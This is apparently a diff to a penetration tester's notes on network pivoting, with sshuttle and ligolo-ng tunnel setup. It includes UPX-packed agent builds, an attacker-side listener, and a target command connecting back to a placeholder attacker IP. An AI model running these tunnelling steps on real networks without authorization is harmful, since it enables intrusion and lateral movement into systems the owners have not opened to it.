@@ -20,49 +20,7 @@ ipconfig /all
 netstat -r
 ```
 
-## Access Domain Names
-
-For a box that is not joined to the domain, but has domain access, add the DC (or DNS server) to resolve DNS names.
-
-**Split DNS Resolution (w/ VPN)**
-```bash
-# 1. Enable dnsmasq plugin (Global Config)
-sudo cp /etc/NetworkManager/NetworkManager.conf /etc/NetworkManager/NetworkManager.conf.bak
-sudo sed -i '/\[main\]/a dns=dnsmasq' /etc/NetworkManager/NetworkManager.conf
-
-# 2. Create the Domain Rule (Persistent)
-# Syntax: server=/domain.com/10.10.10.10
-echo "server=/<FQDN>/<DNS_SERVER>" | sudo tee /etc/NetworkManager/dnsmasq.d/split_dns.conf
-
-# 3. Restart NetworkManager to apply the plugin change
-sudo systemctl restart NetworkManager
-
-# 4. Configure the VPN Connection
-# Replace <CONNECTION_NAME> with your VPN profile name (e.g., 'tun0' or 'lab_vpn')
-sudo nmcli connection modify "<CONNECTION_NAME>" ipv4.dns ""
-sudo nmcli connection modify "<CONNECTION_NAME>" ipv4.ignore-auto-dns yes
-sudo nmcli connection modify "<CONNECTION_NAME>" ipv4.never-default yes
-
-# 5. Reconnect VPN
-sudo nmcli connection down "<CONNECTION_NAME>"
-sudo nmcli connection up "<CONNECTION_NAME>"
-```
-
-**All DNS Resolution (no Internet access)**
-```bash
-# Configure the VPN connection to strictly use the Target DNS
-sudo nmcli connection modify "<CONNECTION_NAME>" ipv4.dns "<DNS_SERVER>"
-sudo nmcli connection modify "<CONNECTION_NAME>" ipv4.ignore-auto-dns yes
-
-# Reconnect to apply
-sudo nmcli connection down "<CONNECTION_NAME>"
-sudo nmcli connection up "<CONNECTION_NAME>"
-```
-
-**Verify**
-```bash
-nslookup <TARGET>
-```
+{{< embed-section page="Docs/9 - Notes/Troubleshooting" header="access-domain-names" >}}
 
 ## Domain Information
 
@@ -276,8 +234,10 @@ route
 
 ## Sshuttle
 
-"Transparent proxy server that works as a poor man's VPN. Forwards over ssh. Doesn't require admin... Supports DNS tunneling."
 - https://github.com/sshuttle/sshuttle
+
+"Transparent proxy server that works as a poor man's VPN. Forwards over ssh. Doesn't require admin... Supports DNS tunneling `--dns`." **Works for TCP but NOT ICMP**
+
 
 ```bash
 sudo apt install -y sshuttle
@@ -345,25 +305,22 @@ Sets up a new interface and route to move traffic
 
 ```bash
 git clone https://github.com/nicocha30/ligolo-ng.git && cd ligolo-ng
-go build -o agent cmd/agent/main.go
-go build -o proxy cmd/proxy/main.go
+
 # Build for Windows
-GOOS=windows go build -o agent.exe cmd/agent/main.go
-GOOS=windows go build -o proxy.exe cmd/proxy/main.go
+CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o agent.exe cmd/agent/main.go CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o proxy.exe cmd/proxy/main.go
 # Build for Linux
-GOOS=linux go build -o agent cmd/agent/main.go
-GOOS=linux go build -o proxy cmd/proxy/main.go
+CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o agent cmd/agent/main.go CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o proxy cmd/proxy/main.go
 ### SHRINK (10MB -> 3MB)
 upx --lzma agent* proxy*
 ```
 
-
 ### ATTACKER: Listener
+
 ```bash
 sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
 sudo ip addr add <MY_IP_ON_SUBNET>/24 dev ligolo  # .252
-sudo ./proxy -selfcert  # listens on :11601 by default
+sudo ./proxy -selfcert -laddr 0.0.0.0:11601
 ```
 
 ### Target 
@@ -384,7 +341,7 @@ tunnel_start --tun ligolo
 
 ```bash
 # Target
-.\agent.exe -connect <ATTACKER_IP>:<PORT> -ignore-cert
+.\agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert
 
 # ATTACKER: ligolo session
 session
